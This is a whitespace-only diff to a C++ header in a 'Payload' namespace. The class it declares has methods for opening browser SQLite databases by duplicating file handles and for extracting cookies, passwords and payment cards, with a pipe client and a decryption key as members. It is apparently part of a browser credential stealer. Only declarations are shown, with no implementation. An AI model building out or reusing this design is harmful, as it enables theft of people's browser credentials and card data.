@@ -19,11 +19,11 @@ namespace Payload {
 
     private:
         sqlite3* OpenDatabase(const std::filesystem::path& dbPath);
-        
+
         sqlite3* OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath);
-        
+
         void CleanupTempFiles();
-        
+
         void ExtractCookies(sqlite3* db, const std::filesystem::path& outFile);
         void ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile);
         void ExtractCards(sqlite3* db, const std::filesystem::path& outFile);
@@ -35,7 +35,7 @@ namespace Payload {
         PipeClient& m_pipe;
         std::vector<uint8_t> m_key;
         std::filesystem::path m_outputBase;
-        
+
         std::vector<std::filesystem::path> m_tempFiles;
     };
 
